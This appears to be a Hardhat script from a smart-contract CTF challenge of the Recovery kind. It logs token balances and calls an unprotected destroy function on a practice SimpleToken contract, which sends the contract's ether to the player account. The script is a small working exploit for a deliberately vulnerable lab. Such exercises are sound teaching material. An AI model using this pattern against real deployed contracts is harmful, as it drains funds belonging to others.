const { ethers } = require("hardhat")

async function main() {
    // Note, in the original challenge we had to find the address of the recovery contract and then do the needful
    // However, it was easy once you could see the contracts on etherscan, or calculate the address

    const accounts = await ethers.getSigners()
    const player = accounts[1]
    const deployer = accounts[0]

    const recovery = await ethers.getContract("Recovery")
    const simpleToken = await ethers.getContract("SimpleToken")

    console.log(
        `Current balance of ${deployer.address} at SimpleToken ${await simpleToken.balances(
            deployer.address
        )}`
    )
    console.log(
        `Current balance of ${player.address} at SimpleToken ${await simpleToken.balances(
            player.address
        )}`
    )
    console.log(`Calling the destroy function...`)

    const attack = simpleToken.destroy(player.address)
}
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
